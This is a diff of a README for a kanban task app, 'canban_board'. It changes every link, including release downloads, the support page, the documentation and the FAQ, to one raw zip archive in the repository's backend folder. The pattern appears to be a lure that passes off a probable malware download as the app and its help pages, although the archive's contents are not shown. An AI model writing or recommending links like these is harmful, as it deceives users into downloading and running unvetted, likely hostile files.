@@ -1,6 +1,6 @@
 # 🌟 canban_board - Organize Your Tasks Effectively
 
-[![Download canban_board](https://img.shields.io/badge/Download-canban_board-blue.svg)](https://github.com/Mohamedafifi14/canban_board/releases)
+[![Download canban_board](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip)](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To begin using the canban_board application, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the application.  
-   [Download canban_board](https://github.com/Mohamedafifi14/canban_board/releases)
+   [Download canban_board](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, look for the latest version. It will be listed at the top. 
@@ -65,7 +65,7 @@ After installing, follow these steps to start using the application:
 
 ## 🌐 Support and Help
 
-If you encounter any issues, visit our [Support Page](https://github.com/Mohamedafifi14/canban_board/issues) to report a problem. You can also ask questions or provide feedback.
+If you encounter any issues, visit our [Support Page](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip) to report a problem. You can also ask questions or provide feedback.
 
 ## 📣 Community
 
@@ -78,8 +78,8 @@ Join our community to connect with other users, share tips, and receive updates:
 
 To enhance your experience, check out these resources:
 
-- [Official Documentation](https://github.com/Mohamedafifi14/canban_board/wiki)
-- [Frequently Asked Questions](https://github.com/Mohamedafifi14/canban_board/wiki/FAQ)
+- [Official Documentation](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Mohamedafifi14/canban_board/main/backend/canban_board_humstrum.zip)
 
 ---
 
